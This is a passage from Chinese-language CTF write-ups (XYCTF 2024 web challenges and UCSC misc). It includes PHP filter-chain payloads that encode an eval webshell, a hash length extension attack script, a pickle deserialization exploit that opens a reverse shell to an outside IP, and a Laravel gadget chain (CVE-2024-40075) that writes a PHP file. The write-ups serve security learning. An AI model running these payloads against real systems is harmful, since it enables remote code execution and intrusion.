\u0026#34;convert.iconv.UTF8.CSISO2022KR|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; for c in base64_payload[::-1]: filters += conversions[c] + \u0026#34;|\u0026#34; # decode and reencode to get rid of everything that isn\u0026#39;t valid base64 filters += \u0026#34;convert.base64-decode|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # get rid of equal signs filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; filters += \u0026#34;convert.base64-decode\u0026#34; final_payload = f\u0026#34;php://filter/{filters}/resource={file_to_use}\u0026#34; r = requests.get(url, params={ \u0026#34;0\u0026#34;: command, \u0026#34;action\u0026#34;: \u0026#34;include\u0026#34;, \u0026#34;file\u0026#34;: final_payload }) print(r.text) 官方给出的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 \u0026lt;?php // 基础payload，这是一个被base64编码的字符串 // 解码后的内容是 \u0026lt;?php @eval($_REQUEST[\u0026#39;cmd\u0026#39;]);， $base64_payload = \u0026#34;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4\u0026#34;; // 定义一个转换规则数组，每个字符对应多种iconv转换规则组合 // 这些规则用于在字符编码转换过程中混淆payload，绕过安全检测 $conversions = array( // \u0026#39;/\u0026#39; 字符的转换规则，通过多次iconv转换来混淆数据 \u0026#39;/\u0026#39; =\u0026gt; \u0026#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4\u0026#39;, // 数字字符的转换规则 // 每个数字对应多个稀奇古怪的字符编码转换规则组合 \u0026#39;0\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;1\u0026#39; =\u0026gt; \u0026#39;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4\u0026#39;, \u0026#39;2\u0026#39; =\u0026gt; \u0026#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921\u0026#39;, \u0026#39;3\u0026#39; =\u0026gt; \u0026#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE\u0026#39;, \u0026#39;4\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39;, \u0026#39;5\u0026#39; =\u0026gt; \u0026#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE\u0026#39;, \u0026#39;6\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2\u0026#39;, \u0026#39;7\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;8\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, // 大写字母的转换规则 \u0026#39;A\u0026#39; =\u0026gt; \u0026#39;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213\u0026#39;, \u0026#39;B\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;D\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;E\u0026#39; =\u0026gt; \u0026#39;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT\u0026#39;, \u0026#39;F\u0026#39; =\u0026gt; \u0026#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB\u0026#39;, \u0026#39;G\u0026#39; =\u0026gt; \u0026#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90\u0026#39;, \u0026#39;H\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213\u0026#39;, \u0026#39;I\u0026#39; =\u0026gt; \u0026#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213\u0026#39;, \u0026#39;J\u0026#39; =\u0026gt; \u0026#39;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4\u0026#39;, \u0026#39;K\u0026#39; =\u0026gt; \u0026#39;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE\u0026#39;, \u0026#39;L\u0026#39; =\u0026gt; \u0026#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC\u0026#39;, \u0026#39;M\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T\u0026#39;, \u0026#39;N\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4\u0026#39;, \u0026#39;O\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775\u0026#39;, \u0026#39;P\u0026#39; =\u0026gt; \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB\u0026#39;, \u0026#39;Q\u0026#39; =\u0026gt; \u0026#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2\u0026#39;, \u0026#39;R\u0026#39; =\u0026gt; \u0026#39;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4\u0026#39;, \u0026#39;S\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS\u0026#39;, \u0026#39;T\u0026#39; =\u0026gt; \u0026#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103\u0026#39;, \u0026#39;U\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;V\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB\u0026#39;, \u0026#39;W\u0026#39; =\u0026gt; \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936\u0026#39;, \u0026#39;X\u0026#39; =\u0026gt; \u0026#39;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932\u0026#39;, \u0026#39;Y\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361\u0026#39;, \u0026#39;Z\u0026#39; =\u0026gt; \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16\u0026#39;, // 小写字母的转换规则 // 同样使用各种稀奇古怪的字符编码转换组合来混淆数据 \u0026#39;a\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE\u0026#39;, \u0026#39;b\u0026#39; =\u0026gt; \u0026#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE\u0026#39;, \u0026#39;c\u0026#39; =\u0026gt; \u0026#39;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2\u0026#39;, \u0026#39;d\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;e\u0026#39; =\u0026gt; \u0026#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937\u0026#39;, \u0026#39;f\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213\u0026#39;, \u0026#39;g\u0026#39; =\u0026gt; \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8\u0026#39;, \u0026#39;h\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE\u0026#39;, \u0026#39;i\u0026#39; =\u0026gt; \u0026#39;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000\u0026#39;, \u0026#39;j\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16\u0026#39;, \u0026#39;k\u0026#39; =\u0026gt; \u0026#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2\u0026#39;, \u0026#39;l\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE\u0026#39;, \u0026#39;m\u0026#39; =\u0026gt; \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949\u0026#39;, \u0026#39;n\u0026#39; =\u0026gt; \u0026#39;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61\u0026#39;, \u0026#39;o\u0026#39; =\u0026gt; \u0026#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE\u0026#39;, \u0026#39;p\u0026#39; =\u0026gt; \u0026#39;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4\u0026#39;, \u0026#39;q\u0026#39; =\u0026gt; \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2\u0026#39;, \u0026#39;r\u0026#39; =\u0026gt; \u0026#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101\u0026#39;, \u0026#39;s\u0026#39; =\u0026gt; \u0026#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90\u0026#39;, \u0026#39;t\u0026#39; =\u0026gt; \u0026#39;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS\u0026#39;, \u0026#39;u\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61\u0026#39;, \u0026#39;v\u0026#39; =\u0026gt; \u0026#39;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932\u0026#39;, \u0026#39;w\u0026#39; =\u0026gt; \u0026#39;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE\u0026#39;, \u0026#39;x\u0026#39; =\u0026gt; \u0026#39;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS\u0026#39;, \u0026#39;y\u0026#39; =\u0026gt; \u0026#39;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT\u0026#39;, \u0026#39;z\u0026#39; =\u0026gt; \u0026#39;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937\u0026#39; ); // 初始化过滤链，首先进行base64编码 $filters = \u0026#34;convert.base64-encode|\u0026#34;; $filters .= \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34;; // 遍历反转后的base64_payload中的每个字符 foreach (str_split(strrev($base64_payload)) as $c) { // 为每个字符添加对应的转换规则链 $filters .= $conversions[$c] . \u0026#34;|\u0026#34;; // 添加base64解码和编码步骤，用于进一步混淆数据 $filters .= \u0026#34;convert.base64-decode|\u0026#34;; $filters .= \u0026#34;convert.base64-encode|\u0026#34;; // 添加UTF8到UTF7的转换，继续混淆数据 $filters .= \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34;; } // 最后添加base64解码完成整个转换链 $filters .= \u0026#34;convert.base64-decode\u0026#34;; // 构建最终payload，使用php://filter协议和构建的过滤链读取/etc/passwd文件 $final_payload = \u0026#34;php://filter/{$filters}/resource=/etc/passwd\u0026#34;; var_dump($final_payload); 运行后打payload然后就可以执行命令cmd=system(\u0026rsquo;/readflag\u0026rsquo;);\n此方法没上个方法简洁，但是字母映射表很全所以记录一下。\n连连看到底是连连什么看 这个题跟上面的题一样，可以用上面的官方脚本进行构造内容改成XYCTF的base64编码就行，当然此题还可以利用其它工具，不过源码和上面原理差不多。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $p=$_GET[\u0026#39;p\u0026#39;]; if(preg_match(\u0026#34;/http|=|php|file|:|\\/|\\?/i\u0026#34;, $p)) { die(\u0026#34;waf!\u0026#34;); } $payload=\u0026#34;php://filter/$p/resource=/etc/passwd\u0026#34;; if(file_get_contents($payload)===\u0026#34;XYCTF\u0026#34;){ echo file_get_contents(\u0026#39;/flag\u0026#39;); } 打php_filter_chain\nGitHub - synacktiv/php_filter_chain_generator\n1 python php_filter_chain_generator.py --chain \u0026#39;XYCTF\u0026#39; 直接打XYCTF不行，因为比较是强比较，而这个转换后会有垃圾字符，这时候利用\u0026lt;配合string.strip_tags过滤器剔除垃圾字符，即剔除\u0026lt;后面的所有垃圾字符。\n1 python php_filter_chain_generator.py --chain \u0026#34;XYCTF\u0026lt;\u0026#34; 1 2 p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags 也可以用这个项目跑https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT?tab=readme-ov-file，下面分享的探姬文章讲的很好\n1 p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UTF16|convert.iconv.L6.UTF-16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags XYCTF2024wp | HvAng\u0026rsquo;s Nests\n下面探姬大佬的文章对上面2题都讲了一下，还算详细\n‌⁠﻿﻿‍⁠‍﻿‍‌﻿‍‬﻿﻿﻿‬‍‬⁠‍⁠【idekCTF 2022】Paywall — Filter链构造和扩展 - 飞书云文档\n单论做而言其实我感觉着两个项目讲的有点多余了，上面ezLFl的代码就可以解决，但是这里还是又学习一下这个filter链，顺便用了一下这两个项目。\ngive me flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php include(\u0026#39;flag.php\u0026#39;); $FLAG_md5 = md5($FLAG); if(!isset($_GET[\u0026#39;md5\u0026#39;]) || !isset($_GET[\u0026#39;value\u0026#39;])) { highlight_file(__FILE__); die($FLAG_md5); } $value = $_GET[\u0026#39;value\u0026#39;]; $md5 = $_GET[\u0026#39;md5\u0026#39;]; $time = time(); if(md5($FLAG.$value.$time)===$md5) { echo \u0026#34;yes, give you flag: \u0026#34;; echo $FLAG; } 48260abecbc53b255f3fdb8f39c4b489 打一个哈希拓展延伸，以前写过了Basectf-所有web-wp-CSDN博客，这里所以你说你懂 MD5?详细讲了此题\n设一个不知道内容的字符串a，我们知道a字符串md5 值和a的长度和已知b的一部分（拓展字符，若没用提供也没关系，但提供了就要考虑进去计算，否则计算出的不是原b字符），就可以算出（a+b）的md5值，这里a就是FLAG，b就是value.time。\n这里拓展字符是时间戳，这个time()时间戳是动态的怎么处理？其实只需要要计算当前的时间戳，然后往上加个几十秒(这段时间供你填参数)，然后写代码，持续发送请求即可。\n计算当前时间戳\n1 2 3 \u0026lt;?php $time=time(); echo $time; 哈希长度拓展工具代码，这个需要私包\nGitHub - shellfeel/hash-ext-attack: 哈希长度扩展攻击利用脚本，免去了hashpump需要编译的烦恼下载后与此代码放同一目录即可运行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import sys from loguru import logger from common.HashExtAttack import HashExtAttack def main(): hash_ext_attack = HashExtAttack() logger.remove() logger.add(sys.stderr, level=\u0026#34;INFO\u0026#34;) hash_ext_attack.input_run() if __name__ == \u0026#39;__main__\u0026#39;: main() 参数就这个（flag是uuid模式就是36+XYCTF{}7个字符就是43），当时时间戳是1745397600，我填的1745397700，留足够的时间填参数\n注意value不要带上时间戳time().\n1 2 3 4 5 6 7 8 9 10 import requests url = \u0026#34;http://gz.imxbt.cn:20206/?value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00\u0026amp;md5=d0d430dc54fd23b970fb394cee49caa8\u0026#34; while True: res=requests.get(url) if\u0026#34;XYCTF\u0026#34; in res.text: print(res.text) break login 目录扫描得到register.php\n注册一个账号后，然后登入抓包，发现了base64编码的数据，有很多A字符\n解码发现存有用户信息且发现环境是python，那就是打pickle反序列化\n存在过滤（好像是r被过滤，reduce打不了），普通打法打不了，用 opcode 加反弹shell来rce\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import base64 import requests shell = b\u0026#39;\u0026#39;\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/101.200.39.193/5000 0\u0026lt;\u0026amp;1\u0026#34;\u0026#39;\u0026#39;\u0026#39; # 反弹shell语句 url = \u0026#34;http://gz.imxbt.cn:20243/\u0026#34; payload = b\u0026#39;\u0026#39;\u0026#39;(ctimeit timeit (cos system V\u0026#39;\u0026#39;\u0026#39; + shell + b\u0026#39;\u0026#39;\u0026#39; oo.\u0026#39;\u0026#39;\u0026#39; payload = base64.b64encode(payload).decode() header = {\u0026#34;Cookie\u0026#34;: \u0026#34;RememberMe=\u0026#34; + payload} r = requests.get(url, headers=header) 当然有最简版本\n1 2 3 4 5 6 7 import base64 a = b\u0026#39;\u0026#39;\u0026#39;(cos system S\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/[ip]/2333 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; o. \u0026#39;\u0026#39;\u0026#39; print(base64.b64encode(a).decode()) pickle反序列化初探-先知社区\n最近碰到的 Python pickle 反序列化小总结-先知社区\nBaby_Unserialize 看不懂，java都没学，留几篇文章在这吧\n‌﻿⁠‌‍‌‌⁠﻿⁠⁠‍﻿﻿‌‬‌‍‌⁠‌‍‌⁠探索Java反序列化绕WAF新姿势 - 飞书云文档\n【Web】2024XYCTF题解(全)_xyctf2024-CSDN博客\nXYCTF2024-Web方向题解-CSDN博客\n","date":"2025-04-23T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2024-xyctf-web-%E5%A4%8D%E7%8E%B0/","title":"2024-xyctf-web-复现"},{"content":" web 直接dirsearch扫描得flag.php即可\n预期解打Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php namespace Termwind\\ValueObjects{ Class Styles{ private array $textModifiers; private array $properties; public function __construct(){ $this-\u0026gt;textModifiers = [\u0026#34;file_put_contents\u0026#34;]; $this-\u0026gt;properties = [\u0026#34;styles\u0026#34;=\u0026gt;\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;, \u0026#34;parentStyles\u0026#34;=\u0026gt;0]; }\t#命令稍微改一下就能打了 } } namespace Termwind\\Components{ use Termwind\\ValueObjects\\Styles; abstract Class Element{ protected string $content; protected Styles $styles; public function __construct() { $this-\u0026gt;content = \u0026#39;testtesttest.php\u0026#39;; $this-\u0026gt;styles = new Styles(); } } Class Hr extends Element{} } namespace Psy\\Readline\\Hoa{ use Termwind\\Components\\Hr; abstract Class Stream{ protected $_bucket; public function __construct(){ $this-\u0026gt;_bucket = [new Hr()]; } } Class FileRead extends Stream {} } namespace Monolog\\Handler{ use Psy\\Readline\\Hoa\\FileRead; Class GroupHandler{ protected array $handlers; public function __construct(){ $this-\u0026gt;handlers = [new FileRead()]; } } } namespace { $obj = new Monolog\\Handler\\GroupHandler(); echo base64_encode(serialize($obj)); } Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075)-先知社区\nmisc three-ucsc 盲水印命令\n1 java -jar BlindWatermark-v0.0.3.jar decode -f signwithflag.png flag.png 得到8f02d3e7\n然后二进制转base64转摩斯\n-ce89-4d6b-830e-\n流量包追逐流一翻找到part3密码\n得到5d0cb5695077\n最终flag{8f02d3e7-ce89-4d6b-830e-5d0cb5695077}\n小套不是套 第一个二维码一扫得到tess的密码!@#QWE123987。\n第二层是个伪加密，09改00\n得到图片\n补充残缺的png头+Our Secret解密 010打开，FFD9其实是给确少png文件头的png。为什么？首先png文件头格式是\n1 89 50 4E 47 0D 0A 1A 0A 且一定有IHDR数据块\n然后0D 0A 1A 0A开始复制到png文件尾（IEND块00 00 00 00 49 45 4E 44 AE 42 60 82）\n在这段数据块前添加png文件头89 50 4E 47就组成了一个新的图片\n但是其实不对，后面的数据块也要加上，因为这个特征是oursecret隐写\n后面其实这就是隐藏的数据，所以用Our Secret来解密（文档隐藏，解密工具）\ncrc爆破 但是Our Secret解密需要密钥，所以肯定来自于套.zip,看里面全是很小字节的文件，再看看crc，那肯定是crc爆破（爆破每一个压缩包的CRC值获取有意义的字符串）\n网上没有什么按顺序自动化的提取压缩包crc并爆破crc得到结果，下面这个可以很快的提取crc，但是爆破很慢，而且不能将爆破后的crc结果按顺序拼接在一起，不过可以用它提取出crc，然后我们写脚本爆破！\n工具GitHub - AabyssZG/CRC32-Tools: Easy CRC32 Tools，so easy！！！\nCTF-Misc Guide - ⚡Lunatic BLOG⚡\n1 python CRC32-Tools.py -4 套.zip 很快就提取出来了，然后让ai将这些crc按文件顺序排序，再爆破，再拼接就好了。（其实将这堆数据给ai，让它排序，它就自动排序了）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 import binascii import string from itertools import product # =================配置区================= CRC_LIST = [ 0x9a70f44a, 0xed3cf30c, 0xc31b9eed, 0x80ea10ee, 0x3c9f215d, 0xb8afb3a5, 0x970e9680, 0x7dd1f5d4, 0x9b2bb671, 0xca796ad9, 0xc7886351, 0x684cb228, 0x4fba3a6e, 0x2ebcaa7d, 0xaa6c9f1b, 0x956b6759, 0xcbaa5851, 0x37e61f54, 0xe1157dcf, 0x999a3789, 0x1908fc9a, 0xf73f4991, 0x597cd643, 0xd2fe5d72, 0xc91c7092, 0x790fe28f, 0x2c1a0170, 0x2523e64a, 0x5b4282f2, 0x2860a82f ] CHARSET = string.printable[:-5] # 可打印字符排除控制字符 THREADS = 8 # 多线程加速配置 # ======================================== def crack_crc(target_crc): \u0026#34;\u0026#34;\u0026#34;CRC32爆破核心函数\u0026#34;\u0026#34;\u0026#34; for combo in product(CHARSET, repeat=4): data = \u0026#39;\u0026#39;.join(combo).encode() if binascii.crc32(data) \u0026amp; 0xFFFFFFFF == target_crc: return data.decode() return \u0026#34;????\u0026#34; # 未找到时的占位符 def main(): # 按文件名数字顺序处理 sorted_crc = sorted( [(i+1, crc) for i, crc in enumerate(CRC_LIST)], key=lambda x: x[0] ) # 爆破并拼接结果 flag_parts = [] for idx, crc in sorted_crc: print(f\u0026#34;[*] 正在爆破 f{idx}.bin (0x{crc:08x})...\u0026#34;) result = crack_crc(crc) flag_parts.append(result) print(f\u0026#34;[+] f{idx}.bin -\u0026gt; {result}\u0026#34;) # 处理填充并输出flag full_flag = \u0026#39;\u0026#39;.join(flag_parts).rstrip(\u0026#39;\\x00\u0026#39;) print(\u0026#34;\\n=================最终结果=================\u0026#34;) print(f\u0026#34;{full_flag}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() 再随波逐流梭哈一下得到Key is SecretIsY0u，所以密钥就是SecretIsY0u\n1 2 3 